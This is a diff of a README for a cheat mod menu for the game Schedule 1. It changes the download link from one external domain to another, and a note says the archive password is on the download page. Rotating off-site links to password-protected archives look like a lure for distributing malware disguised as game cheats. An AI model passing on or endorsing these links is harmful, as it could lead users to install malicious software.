@@ -18,7 +18,7 @@ Complete mod menu for Schedule 1 with all cheats in one GUI. Money, inventory, c
 
 ## Download
 
-[![Download v4.0.0](https://img.shields.io/badge/Download_v4.0.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/schedule1mod)
+[![Download v4.0.0](https://img.shields.io/badge/Download_v4.0.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/schedule1mod)
 
 > The archive password is shown on the download page.
 
